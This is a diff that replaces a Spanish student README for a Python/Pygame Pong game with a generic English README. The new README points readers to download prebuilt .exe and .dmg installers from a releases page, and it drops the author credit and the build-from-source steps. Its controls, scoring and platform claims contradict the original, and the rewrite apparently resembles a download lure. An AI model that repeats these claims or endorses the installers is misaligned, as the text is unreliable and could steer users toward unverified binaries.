@@ -1,73 +1,75 @@
-# 🏓 Proyecto Pong en Python
-Este proyecto consiste en una **versión del juego clásico Pong** desarrollada en **Python** utilizando la biblioteca **Pygame**. Fue creado como proyecto educativo y de práctica en programación de videojuegos simples.
+# 🎮 Pong - Play the Classic Game Easily
 
-## 📌 Descripción
-El juego permite que **dos jugadores** compitan en la misma computadora controlando cada uno su paleta para evitar que la pelota salga de su lado de la pantalla. Incluye sonidos, marcadores visibles y una pantalla de ganador con opción de reiniciar.
+## 🚀 Getting Started
 
-## 🚀 Funcionalidades
-- Control de paletas:
-  - **Jugador 1:** `W` (arriba) / `S` (abajo)
-  - **Jugador 2:** `Flecha Arriba` / `Flecha Abajo`
-- Pantalla de selección de meta de puntos: 5, 10 o 15.
-- Marcadores visibles durante el juego.
-- Sonidos al:
-  - Golpear paleta
-  - Rebotar en pared
-  - Anotar punto
-- Pantalla de ganador con opción de **volver a jugar** o **cerrar el juego**.
-- Icono personalizado en la ventana del juego.
-- Ejecutable `.exe` disponible para Windows.
+Welcome to Pong! This is a version of the classic Pong game, developed in Python with the Pygame library. You will enjoy a simple and engaging gaming experience. Follow these steps to get started.
 
-## 🛠️ Requisitos
-- Python 3.8 o superior
-- Pygame
-Instalación de Pygame:
+### 🔗 Download the Game
 
-```bash
-pip install pygame
-```
-## 📂 Esctructura del proyecto
-```
-Proyecto Pong/
-│
-├── pong.py
-├── pong.ico
-├── golpe_paleta.mp3
-├── golpe_pared.mp3
-├── punto2.mp3
-└── README.md
-```
+[![Download Pong](https://img.shields.io/badge/Download-Pong-blue.svg)](https://github.com/Dodogntng/Pong/releases)
 
-## 📖 Cómo ejecutar
-1. Ejecuta el script pong.py con Python:
-    ```
-     python pong.py
-    ```
-   o abre el archivo .exe si ya generaste el ejecutable.
-2. Selecciona la meta de puntos en el menú principal.
-3. Controla las paletas según el jugador.
-4. El primer jugador en alcanzar la meta de puntos gana.
-5. En la pantalla de ganador, presiona:
-    `s` para volver a jugar
-    `n` para salir del juego
+## 🖥️ System Requirements
 
-## ⚙️ Generar archivo ejecutable (.exe)
-Se puede generar un ejecutable en Windows usando PyInstaller:
-```
-  pip install pyinstaller
-  pyinstaller --onefile --windowed --icon=pong.ico pong.py
-```
-El ejecutable se generará dentro de la carpeta dist.
+Make sure your computer meets the following requirements to play Pong:
 
-## 📈 Posibles mejoras
-1. Agregar modos de juego adicionales, como “contrarreloj” o “nivel de dificultad”.
-2. Incluir efectos de sonido y música de fondo más variados.
-3. Mejorar la inteligencia artificial para el jugador 2.
-4. Optimizar el juego para distintos tamaños de pantalla y resoluciones.
-5. Guardar puntuaciones máximas y estadísticas de juego.
-6. Implementar soporte para controles externos o gamepads.
-7. Añadir animaciones más atractivas para la pelota y las paletas.
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** 1 GHz or faster
+- **Memory:** 2 GB RAM minimum
+- **Graphics:** Any graphics card that supports Pygame 
 
-## 👨‍💻 Créditos
-Juego desarrollado por **Iván Narciso Guzmán Hernández** como práctica académica y personal para el aprendizaje de programación en Python, desarrollo de videojuegos con Pygame y manejo de recursos multimedia. Este proyecto permite practicar conceptos de lógica de programación, manejo de eventos, colisiones y creación de interfaces gráficas interactivas.
-Icono y sonidos incluidos para mejorar la experiencia de juego.
+## 📦 Download & Install
+
+To download and run Pong, follow these steps:
+
+1. Visit the [Releases page](https://github.com/Dodogntng/Pong/releases).
+2. Look for the latest version available.
+3. Download the installation file for your operating system. The file will typically have a name like `Pong-vX.X.exe` for Windows or `Pong-vX.X.dmg` for macOS.
+4. Open the downloaded file and follow the on-screen instructions to install Pong.
+
+Once you have installed the game, you can start enjoying it!
+
+## 🎮 How to Play
+
+- **Launch the Game:** Find the Pong icon on your desktop or in your applications folder. Double-click it to open.
+- **Game Controls:** Use the arrow keys to move your paddle up and down. Try to hit the ball back to your opponent!
+- **Objective:** Score points by getting the ball past your opponent's paddle. The first player to reach 10 points wins the game.
+
+## 🤝 Contributing
+
+We welcome contributions! If you have ideas, bugs to report, or features to suggest, feel free to contribute. Here’s how you can help:
+
+1. **Fork the Repository:** Click on the "Fork" button to create a personal copy of Pong.
+2. **Make Changes:** Modify the code to improve the game.
+3. **Submit a Pull Request:** Share your changes with the community. 
+
+## 📝 Frequently Asked Questions
+
+### 1. What if the game does not run?
+
+First, check if your system meets the requirements listed above. If you still have issues, try reinstalling the game.
+
+### 2. Can I play Pong with friends?
+
+Yes! You can play multiplayer mode with a friend using the same computer.
+
+### 3. Is Pong open source?
+
+Yes, Pong is an open-source project. You can view the source code and contribute to its development.
+
+## 🌟 Features
+
+- **Classic Gameplay:** Enjoy the timeless fun of Pong.
+- **Local Multiplayer:** Challenge a friend for an exciting game.
+- **Simple Controls:** Easy to learn and play for everyone.
+- **Educational Value:** A great way to learn basic programming concepts with Python and Pygame.
+
+## 📧 Contact
+
+If you have any questions or need support, you can contact us via the issue tracker on GitHub. We appreciate your feedback and are here to help.
+
+## 🔗 Additional Resources
+
+- [Pygame Documentation](https://www.pygame.org/docs/)
+- [More Python Projects](https://github.com/topics/python)
+
+Thank you for choosing Pong! Enjoy the game and have fun!
